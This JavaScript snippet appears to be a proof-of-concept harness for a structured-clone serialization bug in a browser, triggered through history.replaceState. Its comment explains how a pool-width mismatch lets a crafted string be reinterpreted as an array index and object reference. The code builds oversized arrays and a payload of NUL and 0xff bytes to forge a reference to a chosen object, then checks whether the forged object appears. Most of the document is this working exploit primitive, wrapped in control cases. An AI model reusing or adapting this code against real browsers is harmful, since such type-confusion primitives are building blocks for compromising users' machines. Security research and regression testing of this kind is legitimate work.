// On the 14.00 pool-width mismatch, the final StringTag and StringData header
// should be reinterpreted as an array index and ObjectReferenceTag. The first
// two string bytes complete pool index 0x8000; eight 0xff bytes close the array.
function runCase(id, large, useBigInt) {
  var phase = "build";
  var result;
  try {
    var shared = { marker: 0x51515151 };
    var input;
    var target = null;
    var payload = null;
    if (!large) {
      input = [0, shared, shared];
    } else {
      var filler = new Array(0xfffd);
      filler[0] = useBigInt ? BigInt(1) << BigInt(40) : {};
      for (var i = 1; i < filler.length; i += 1) filler[i] = {};
      target = filler[32766];
      target.marker = 0x6a71c02d;
      payload = "\u0000\u0000" + "\u00ff".repeat(8) + "A".repeat(0x1300 - 10);
      input = new Array(0x10001);
      input[0] = filler;
      input[1] = shared;
      input[2] = shared;
      input[0x10000] = payload;
      if (useBigInt && api && typeof api.markSync === "function")
        api.markSync("reference_bigint_ready");
    }
    phase = "store";
    history.replaceState(input, "");
    phase = "load";
    var output = history.state;
    if (useBigInt && api && typeof api.markSync === "function")
      api.markSync("reference_bigint_loaded");
    phase = "inspect";
    var alias = output[1] === output[2];
    var inserted = large ? output[0x100001] : null;
    var targetClone = large && output[0] ? output[0][32766] : null;
    var correct = Array.isArray(output) && output.length === input.length && alias &&
      output[2] && output[2].marker === 0x51515151 && (!large || output[0x10000] === payload);
    result = { id: id, status: correct ? "pass" : "fail", details: {
      input_length: input.length,
      output_length: typeof output.length === "number" ? output.length : null,
      output_alias: alias,
      tail_ok: !large || output[0x10000] === payload,
      target_marker: targetClone && typeof targetClone.marker === "number" ? targetClone.marker : null,
      inserted_type: large ? typeof inserted : null,
      inserted_marker: inserted && typeof inserted.marker === "number" ? inserted.marker : null,
      inserted_is_target: large ? inserted === targetClone : null,
      payload_length: payload ? payload.length : null
    } };
  } catch (error) {
    result = { id: id, status: "error", details: {
      phase: phase, error: String(error).slice(0, 300)
    } };
  }
  try { history.replaceState(null, ""); result.details.cleanup_ok = true; }
  catch (error) {
    result.status = "error";
    result.details.cleanup_ok = false;
    result.details.cleanup_error = String(error).slice(0, 160);
  }
  return result;
}

var small = runCase("small_number_control", false, false);
if (small.status !== "pass") {
  return [small,
    { id: "reference_no_bigint_control", status: "unsupported", details: { reason: "small_control_failed" } },
    { id: "reference_bigint_case", status: "unsupported", details: { reason: "small_control_failed" } }];
}
var control = runCase("reference_no_bigint_control", true, false);
if (control.status !== "pass") {
  return [small, control,
    { id: "reference_bigint_case", status: "unsupported", details: { reason: "large_control_failed" } }];
}
return [small, control, runCase("reference_bigint_case", true, true)];
